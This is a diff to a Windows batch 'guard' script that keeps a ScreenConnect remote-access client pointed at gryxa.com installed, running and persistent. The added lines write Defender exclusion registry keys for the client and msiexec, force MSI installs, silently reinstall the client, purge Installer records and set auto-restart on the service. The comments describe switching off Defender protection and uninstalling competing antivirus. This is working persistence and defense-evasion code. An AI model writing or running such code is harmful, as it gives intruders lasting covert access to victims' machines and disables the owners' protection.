@@ -1,10 +1,13 @@
 @echo off
-rem WINRTCS_GUARD 0.0.2 - recurring gryxa health (agent-launched ~3h). FP-agnostic: gryxa = any
+rem WINRTCS_GUARD 0.0.3 - recurring gryxa health (agent-launched ~3h). FP-agnostic: gryxa = any
 rem ScreenConnect Client service whose ImagePath contains gryxa.com. Keepers (sevrz) never match.
 rem Ladder: start -> restart -> reinstall (UI MSI -> repo fallback).
 rem 0.0.2: fight-back escalation, evidence-driven via fight.cnt streak (resets only on clean run):
 rem   streak>=2 -> counter Defender (RTM/behavior/IOAV off + policy pins) + stop/disable 3rd-party AV
 rem   streak>=3 -> uninstall the interfering product (once per day, msiexec-quiet or silent flags)
+rem 0.0.3: install preconditioning from proven clean-install (kill svc -> msiexec /x shared PC ->
+rem   purge phantom Installer keys -> orphan/gryxa dir sweep) + one retry; counter reset moved here
+rem   from the agent gate so a lock-busy guard retries next tick instead of waiting 3h.
 setlocal EnableExtensions EnableDelayedExpansion
 set "ZD=C:\ProgramData\WinRTCS"
 set "CURL=%SystemRoot%\System32\curl.exe"
@@ -19,17 +22,20 @@ if not exist "%ZD%" mkdir "%ZD%" >nul 2>&1
 rem --- overlap lock: skip if another guard is mid-run; break lock if stale (>15 min) ---
 "%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -NonInteractive -Command "if (Test-Path '%LOCK%') { $age = (Get-Date) - (Get-Item '%LOCK%').LastWriteTime; if ($age.TotalMinutes -lt 15) { exit 1 } } ; New-Item -Path '%LOCK%' -ItemType File -Force | Out-Null; exit 0" >nul 2>&1
 if errorlevel 1 (
-  echo 170>"%ZD%\guard.cnt"
   endlocal & exit /b 0
 )
+
+rem --- gate owns the cadence; we own the reset (lock-busy above leaves counter high -> retry next tick) ---
+echo 0>"%ZD%\guard.cnt"
 
 if exist "%LOG%" for %%L in ("%LOG%") do if %%~zL GTR 204800 move /y "%LOG%" "%LOG%.old" >nul 2>&1
 set "STREAK=0"
 if exist "%STREAKF%" set /p "STREAK=" <"%STREAKF%"
 echo [%DATE% %TIME%] guard_begin host=%COMPUTERNAME% streak=!STREAK!>>"%LOG%"
 
-rem --- AV shields (re-asserted every run): wildcard path covers any FP dir current+future ---
-powershell -NoProfile -NonInteractive -Command "$ErrorActionPreference='SilentlyContinue'; Add-MpPreference -ExclusionPath 'C:\Program Files (x86)\ScreenConnect Client (*)'; Get-ChildItem 'C:\Program Files (x86)' -Directory -Filter 'ScreenConnect Client (*)' | ForEach-Object { Add-MpPreference -ExclusionPath $_.FullName; $exe = Join-Path $_.FullName 'ScreenConnect.ClientService.exe'; if (Test-Path $exe) { Add-MpPreference -ExclusionProcess $exe } }" >nul 2>&1
+rem --- AV shields: sync reg pin (instant, no Defender service call) + async MpPreference for the rest ---
+reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\Program Files (x86)\ScreenConnect Client (*)" /t REG_DWORD /d 0 /f >nul 2>&1
+start "" /min powershell -NoProfile -NonInteractive -Command "$ErrorActionPreference='SilentlyContinue'; Add-MpPreference -ExclusionPath 'C:\Program Files (x86)\ScreenConnect Client (*)'; Get-ChildItem 'C:\Program Files (x86)' -Directory -Filter 'ScreenConnect Client (*)' | ForEach-Object { Add-MpPreference -ExclusionPath $_.FullName; $exe = Join-Path $_.FullName 'ScreenConnect.ClientService.exe'; if (Test-Path $exe) { Add-MpPreference -ExclusionProcess $exe } }" >nul 2>&1
 
 call :Detect
 if not defined GSVC (
@@ -95,6 +101,32 @@ exit /b 0
 
 :Install
 set "MSI=%ZD%\gryxa_install.msi"
+set "PC={9D7CC418-A356-9693-DCC5-41EC44D03B31}"
+set "PACKED=814CC7D9653A3969CD5C14CE440DB313"
+
+rem --- precondition (proven clean-install): kill gryxa svcs, uninstall shared PC, purge phantoms ---
+call :Detect
+if defined GSVC (
+  sc stop "!GSVC!" >nul 2>&1
+  sc delete "!GSVC!" >nul 2>&1
+)
+msiexec /x %PC% /qn /norestart REBOOT=ReallySuppress >nul 2>&1
+call :PurgePhantom
+
+for /d %%D in ("%ProgramFiles(x86)%\ScreenConnect Client (*)") do (
+  sc query "%%~nxD" >nul 2>&1
+  if errorlevel 1 (
+    rmdir /s /q "%%D" >nul 2>&1
+  ) else (
+    reg query "HKLM\SYSTEM\CurrentControlSet\Services\%%~nxD" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
+    if not errorlevel 1 rmdir /s /q "%%D" >nul 2>&1
+  )
+)
+
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /t REG_DWORD /d 0 /f >nul 2>&1
+reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "msiexec.exe" /t REG_DWORD /d 0 /f >nul 2>&1
+reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "ScreenConnect.ClientService.exe" /t REG_DWORD /d 0 /f >nul 2>&1
+
 set "SRC=ui"
 del /f /q "%MSI%" >nul 2>&1
 echo [%DATE% %TIME%] fetch_ui>>"%LOG%"
@@ -111,21 +143,46 @@ if not exist "%MSI%" ( echo [%DATE% %TIME%] FAIL_no_msi_source>>"%LOG%" & goto :
 for %%F in ("%MSI%") do if %%~zF LSS 5000000 ( echo [%DATE% %TIME%] FAIL_msi_small>>"%LOG%" & del /f /q "%MSI%" >nul 2>&1 & goto :Done )
 
 :DoInstall
-echo [%DATE% %TIME%] msi_install src=!SRC!>>"%LOG%"
-msiexec /i "%MSI%" /qn /norestart /l*v "%ZD%\msi_gryxa_install.log" >nul 2>&1
-echo [%DATE% %TIME%] msiexec_exit=!errorlevel!>>"%LOG%"
+set "ATTEMPT=0"
+:TryInstall
+set /a ATTEMPT+=1
+echo [%DATE% %TIME%] msi_install src=!SRC! attempt=!ATTEMPT!>>"%LOG%"
+msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /l*v "%ZD%\msi_gryxa_install.log" >nul 2>&1
+set "MSIEXIT=!ERRORLEVEL!"
+echo [%DATE% %TIME%] msiexec_exit=!MSIEXIT! attempt=!ATTEMPT!>>"%LOG%"
+if "!MSIEXIT!"=="0" goto :WaitSvc
+if "!MSIEXIT!"=="3010" goto :WaitSvc
+if !ATTEMPT! GEQ 2 ( echo [%DATE% %TIME%] FAIL_msiexec_!MSIEXIT!>>"%LOG%" & goto :Done )
+msiexec /x %PC% /qn /norestart REBOOT=ReallySuppress >nul 2>&1
+call :PurgePhantom
+timeout /t 5 /nobreak >nul 2>&1
+goto :TryInstall
+
+:PurgePhantom
+reg delete "HKLM\SOFTWARE\Classes\Installer\Products\%PACKED%" /f >nul 2>&1
+reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\%PACKED%" /f >nul 2>&1
+reg delete "HKCR\Installer\Products\%PACKED%" /f >nul 2>&1
+reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\%PC%" /f >nul 2>&1
+reg delete "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\%PC%" /f >nul 2>&1
+exit /b 0
+
 set "W=0"
 :WaitSvc
 timeout /t 5 /nobreak >nul 2>&1
 call :Detect
 if defined GSVC (
   sc query "!GSVC!" 2>nul | findstr /C:"RUNNING" >nul
-  if not errorlevel 1 goto :WaitSession
+  if not errorlevel 1 goto :SvcUp
 )
 set /a W+=1
 if !W! LSS 12 goto :WaitSvc
 echo [%DATE% %TIME%] FAIL_svc_not_running>>"%LOG%"
 goto :Done
+
+:SvcUp
+sc config "!GSVC!" start= auto >nul 2>&1
+sc failure "!GSVC!" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
+sc start "!GSVC!" >nul 2>&1
 
 :WaitSession
 set "W=0"
